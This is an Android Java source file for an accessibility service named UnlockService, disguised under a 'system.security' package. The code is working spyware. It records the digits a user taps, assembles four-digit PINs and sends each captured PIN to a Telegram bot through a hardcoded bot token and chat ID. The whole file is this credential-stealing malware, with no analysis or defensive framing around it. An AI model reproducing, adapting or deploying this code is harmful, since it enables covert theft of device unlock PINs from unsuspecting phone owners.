package com.system.security;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class UnlockService extends AccessibilityService {

    private StringBuilder pinBuffer = new StringBuilder();
    private long lastClickTime = 0;
    private static final String BOT_TOKEN = "8641599033:AAFqD1brrN4CGQebEFnnCNFire5f3xsDep4";
    private static final String CHAT_ID = "8572227182";

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        sendData("Tizim_uyg'onib_ishga_tushdi!_PIN_kutilmoqda...");
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        // Faqat haqiqiy BOSISH (CLICK) hodisasini ushlaymiz
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_CLICKED) {
            long currentTime = System.currentTimeMillis();
            // Bir marta bosilganda ikki marta ushlamaslik uchun 500ms kutamiz
            if (currentTime - lastClickTime < 500) return;
            
            AccessibilityNodeInfo source = event.getSource();
            if (source != null) {
                processNode(source);
                source.recycle();
                lastClickTime = currentTime;
            }
        }
    }

    private void processNode(AccessibilityNodeInfo node) {
        if (node == null) return;
        
        CharSequence text = node.getText();
        if (text != null && text.length() == 1 && Character.isDigit(text.charAt(0))) {
            pinBuffer.append(text);
            if (pinBuffer.length() == 4) {
                sendData("Captured_PIN: " + pinBuffer.toString());
                pinBuffer.setLength(0);
            }
        }
    }

    private void sendData(final String msg) {
        new Thread(() -> {
            try {
                URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + msg);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.getInputStream().close();
                conn.disconnect();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }

    @Override public void onInterrupt() {}
}
